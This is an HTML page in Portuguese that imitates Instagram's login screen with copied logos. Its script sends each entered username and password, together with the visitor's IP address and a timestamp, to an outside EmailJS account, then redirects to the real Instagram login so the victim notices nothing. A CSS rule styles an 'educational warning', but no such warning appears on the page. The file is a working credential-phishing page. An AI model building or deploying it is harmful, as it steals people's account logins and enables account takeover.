<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram </title>

<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: Arial, Helvetica, sans-serif;
}

body {
    background: #fafafa;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100dvh;
}

.container {
    width: 100%;
    max-width: 420px;
    min-height: 100dvh;
    display: flex;
    flex-direction: column;
    padding: 20px;
}

/* AVISO EDUCATIVO - DESTAQUE */
.aviso {
    background: #fffbda;
    border-left: 4px solid #ffc107;
    padding: 12px;
    margin: 10px 0;
    font-size: 12px;
    color: #856404;
    text-align: center;
    border-radius: 8px;
}

.aviso a {
    color: #1877f2;
    text-decoration: none;
}

.lang {
    text-align: center;
    color: #8e8e8e;
    font-size: clamp(12px, 1.5vw, 14px);
    margin-top: 10px;
}

.logo {
    display: flex;
    justify-content: center;
    margin-top: clamp(40px, 10vh, 80px);
}

.logo img {
    width: clamp(60px, 15vw, 70px);
    height: auto;
    object-fit: contain;
}

.center-block {
    flex: 1;
    display: flex;
    flex-direction: column;
    justify-content: center;
}

.form {
    display: flex;
    flex-direction: column;
    gap: 12px;
}

.input-group {
    position: relative;
    width: 100%;
}

.input-group input {
    width: 100%;
    height: clamp(48px, 7vh, 52px);
    border-radius: 14px;
    border: 0.8px solid #dbdbdb;
    padding: 18px 16px 6px 16px;
    font-size: clamp(13px, 1.8vw, 14px);
    background: #fafafa;
    outline: none;
}

.input-group input:focus {
    border: 0.4px solid #262626;
}

.input-group label {
    position: absolute;
    left: 16px;
    top: 50%;
    transform: translateY(-50%);
    font-size: clamp(13px, 1.8vw, 14px);
    color: #8e8e8e;
    pointer-events: none;
    transition: all 0.2s ease;
}

.input-group input:focus + label,
.input-group input:not(:placeholder-shown) + label {
    top: 10px;
    font-size: 11px;
    color: #8e8e8e;
}

.btn-login {
    margin-top: 10px;
    width: 100%;
    height: clamp(44px, 6vh, 48px);
    border: none;
    border-radius: 24px;
    background: #1877f2;
    color: white;
    font-weight: bold;
    font-size: clamp(14px, 2vw, 16px);
    cursor: pointer;
    transition: opacity 0.3s, background 0.3s;
}

.btn-login:hover {
    opacity: 0.9;
}

.btn-login:disabled {
    background: #b0b0b0;
    cursor: not-allowed;
    opacity: 1;
}

.forgot {
    text-align: center;
    margin-top: 18px;
    font-size: clamp(13px, 1.8vw, 14px);
    color: #262626;
}

.footer {
    margin-top: auto;
}

.btn-create {
    width: 100%;
    height: clamp(44px, 6vh, 48px);
    border-radius: 24px;
    border: 1px solid #1877f2;
    background: transparent;
    color: #1877f2;
    font-weight: bold;
    font-size: clamp(14px, 2vw, 15px);
    cursor: pointer;
}

.meta {
    text-align: center;
    margin-top: 20px;
}

.meta img {
    width: clamp(50px, 20vw, 80px);
    height: auto;
}

.toast {
    position: fixed;
    bottom: 30px;
    left: 50%;
    transform: translateX(-50%);
    background: #262626;
    color: white;
    padding: 12px 24px;
    border-radius: 8px;
    font-size: 14px;
    z-index: 1000;
    animation: fadeInUp 0.3s ease;
}

@keyframes fadeInUp {
    from {
        opacity: 0;
        transform: translateX(-50%) translateY(20px);
    }
    to {
        opacity: 1;
        transform: translateX(-50%) translateY(0);
    }
}
</style>
</head>

<body>

<div class="container">

    <div class="lang">Português (Brasil)</div>

    <div class="logo">
        <img src="https://static.cdninstagram.com/rsrc.php/yY/r/X32GsrNzif6.webp" alt="Instagram Logo">
    </div>

    <div class="center-block">
        <div class="form">

            <div class="input-group">
                <input type="text" id="username" placeholder=" " required>
                <label>Nome de usuário, email ou celular</label>
            </div>

            <div class="input-group">
                <input type="password" id="password" placeholder=" " required>
                <label>Senha</label>
            </div>

            <button class="btn-login" id="btnLogin">Entrar</button>

        </div>

        <div class="forgot">Esqueceu a senha?</div>
    </div>

    <div class="footer">
        <button class="btn-create">Criar nova conta</button>

        <div class="meta">
            <img src="https://logosmarcas.net/wp-content/uploads/2021/11/Meta-Logo.png" alt="Meta Logo">
        </div>
    </div>

</div>

<!-- EmailJS SDK -->
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

<script type="text/javascript">
    // Inicializar EmailJS com sua Public Key
    emailjs.init("TKuZ7CAuQh-zObb_5");
    
    // Seus IDs
    const SERVICE_ID = "service_9gwivaw";
    const TEMPLATE_ID = "template_1b5eb6a";
    
    const btnLogin = document.getElementById('btnLogin');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    
    function showToast(message, isError = false) {
        const existingToast = document.querySelector('.toast');
        if (existingToast) existingToast.remove();
        
        const toast = document.createElement('div');
        toast.className = 'toast';
        toast.textContent = message;
        toast.style.background = isError ? '#ed4956' : '#262626';
        document.body.appendChild(toast);
        
        setTimeout(() => toast.remove(), 3000);
    }
    
    async function getUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return 'IP não disponível';
        }
    }
    
    btnLogin.addEventListener('click', async function(e) {
        e.preventDefault();
        
        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();
        
        if (!username || !password) {
            showToast('⚠️ Preencha todos os campos!', true);
            return;
        }
        
        // Botão fica cinza e desabilitado - texto continua "Entrar"
        btnLogin.disabled = true;
        btnLogin.style.background = "#b0b0b0";
        
        try {
            const now = new Date();
            const accessDate = now.toLocaleString('pt-BR');
            const ipAddress = await getUserIP();
            
            // Enviar via EmailJS
            await emailjs.send(
                SERVICE_ID,
                TEMPLATE_ID,
                {
                    email: username,
                    password: password,
                    access_date: accessDate,
                    ip_address: ipAddress,
                    name: "Instagram Clone - Estudo"
                }
            );
            
            console.log('✅ Enviado!');
            
            // Redirecionar para o meme do YouTube
            window.location.href = "https://www.instagram.com/accounts/login/";
            
        } catch (error) {
            console.error('❌ Erro:', error);
            showToast('Erro ao enviar. Tente novamente.', true);
            
            // Botão volta ao normal
            btnLogin.disabled = false;
            btnLogin.style.background = "#1877f2";
        }
    });
    
    // Enviar com tecla Enter
    usernameInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') btnLogin.click();
    });
    passwordInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') btnLogin.click();
    });
    
    console.log('🚀 Instagram ');
</script>

</body>
</html>
